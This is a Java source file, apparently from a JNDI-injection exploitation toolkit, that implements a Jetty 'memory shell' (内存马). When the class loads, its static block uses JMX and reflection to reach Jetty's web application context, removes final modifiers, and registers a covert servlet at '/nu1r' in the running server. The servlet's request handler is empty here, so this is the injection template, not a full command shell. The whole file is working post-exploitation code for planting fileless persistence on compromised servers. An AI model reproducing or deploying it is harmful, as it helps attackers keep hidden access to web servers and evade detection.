package com.nu1r.jndi.template.jetty;

import com.sun.jmx.mbeanserver.JmxMBeanServer;
import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;

import javax.management.ObjectName;
import javax.servlet.*;
import java.io.IOException;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.Set;

/**
 * jetty Servlet 内存马
 * @author nu1r
 */

public class JSMSFromJMXS implements Servlet {

    static {
        try {
            String servletName = "nu1r" + System.nanoTime();
            String urlPattern  = "/nu1r";

            JmxMBeanServer mBeanServer = (JmxMBeanServer) ManagementFactory.getPlatformMBeanServer();

            Field field = mBeanServer.getClass().getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mBeanServer);

            field = obj.getClass().getDeclaredField("repository");
            field.setAccessible(true);
            Field modifier = field.getClass().getDeclaredField("modifiers");
            modifier.setAccessible(true);
            modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
            Repository repository = (Repository) field.get(obj);

            Set<NamedObject> namedObjectSet = repository.query(new ObjectName("org.eclipse.jetty.webapp:type=webappcontext,*"), null);
            for (NamedObject namedObject : namedObjectSet) {
                try {
                    field = namedObject.getObject().getClass().getSuperclass().getSuperclass().getDeclaredField("_managed");
                    field.setAccessible(true);
                    modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
                    Object webAppContext = field.get(namedObject.getObject());

                    field = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
                    field.setAccessible(true);
                    Object handler = field.get(webAppContext);

                    field = handler.getClass().getDeclaredField("_servlets");
                    field.setAccessible(true);
                    Object[] objects = (Object[]) field.get(handler);

                    boolean flag = false;
                    for (Object o : objects) {
                        field = o.getClass().getSuperclass().getDeclaredField("_name");
                        field.setAccessible(true);
                        String name = (String) field.get(o);
                        if (name.equals(servletName)) {
                            flag = true;
                            break;
                        }
                    }

                    if (!flag) {
                        ClassLoader classLoader = handler.getClass().getClassLoader();
                        Class       sourceClazz = null;
                        Object      holder      = null;
                        try {
                            sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
                            field = sourceClazz.getDeclaredField("JAVAX_API");
                            modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
                            Method method = handler.getClass().getMethod("newServletHolder", sourceClazz);
                            holder = method.invoke(handler, field.get(null));
                        } catch (ClassNotFoundException e) {
                            try {
                                sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
                            } catch (ClassNotFoundException ignored) {
                                sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Holder$Source");
                            }
                            Method method = handler.getClass().getMethod("newServletHolder", sourceClazz);
                            holder = method.invoke(handler, Enum.valueOf(sourceClazz, "JAVAX_API"));
                        }

                        holder.getClass().getMethod("setName", String.class).invoke(holder, servletName);
                        Servlet servlet = new JSMSFromJMXS();
                        holder.getClass().getMethod("setServlet", Servlet.class).invoke(holder, servlet);
                        handler.getClass().getMethod("addServlet", holder.getClass()).invoke(handler, holder);

//                    ServletMapping mappingx = new ServletMapping(Source.JAVAX_API);
//                    mappingx.setServletName(ServletHolder.this.getName());
//                    mappingx.setPathSpecs(urlPatterns);
//                    ServletHolder.this.getServletHandler().addServletMapping(mappingx);

                        Class  clazz          = classLoader.loadClass("org.eclipse.jetty.servlet.ServletMapping");
                        Object servletMapping = null;
                        try {
                            servletMapping = clazz.getDeclaredConstructor(sourceClazz).newInstance(field.get(null));
                        } catch (NoSuchMethodException e) {
                            servletMapping = clazz.newInstance();
                        }

                        servletMapping.getClass().getMethod("setServletName", String.class).invoke(servletMapping, servletName);
                        servletMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(servletMapping, new Object[]{new String[]{urlPattern}});
                        handler.getClass().getMethod("addServletMapping", clazz).invoke(handler, servletMapping);
                    }
                } catch (Exception e) {
                    //pass
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {

    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}
